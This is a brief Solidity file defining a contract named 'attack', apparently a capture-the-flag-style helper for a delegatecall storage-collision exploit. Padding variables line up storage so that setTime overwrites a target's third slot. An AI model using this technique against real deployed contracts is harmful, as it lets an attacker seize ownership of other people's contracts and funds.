//SPDX-License-Identifier: MIT

pragma solidity^0.8.0;

contract attack {
    uint256 dummy1;
    uint256 dummy2;
    uint256 dummy3;
    function setTime(uint256 fakeTimeStamp) public {
        dummy3 = fakeTimeStamp;
    }
}
